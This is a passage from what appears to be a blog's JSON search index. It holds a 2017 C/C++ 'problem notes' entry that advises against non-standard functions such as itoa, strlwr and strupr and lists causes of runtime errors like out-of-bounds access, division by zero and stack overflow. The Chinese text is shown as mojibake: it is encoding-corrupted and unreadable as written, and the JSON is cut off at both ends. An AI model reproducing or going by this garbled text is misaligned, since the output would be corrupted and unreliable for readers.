å°½é‡é¿å…ä½¿ç”¨é C æ ‡å‡†åº“å‡½æ•°ï¼Œå¦‚ itoa, strlwr, strupr ä¹‹ç±» RTE ä¸»è¦åŸå› ï¼šæ•°ç»„è¶Šç•Œã€æŒ‡é’ˆè¶Šç•Œã€é™¤ä»¥ 0ã€æ ˆæº¢å‡ºâ€¦â€¦ ","date":"2017-11-08","objectID":"/newbie-note/:3:0","tags":["C/C++"],"title":"é—®é¢˜ç¬”è®°","uri":"/newbie-note/"}]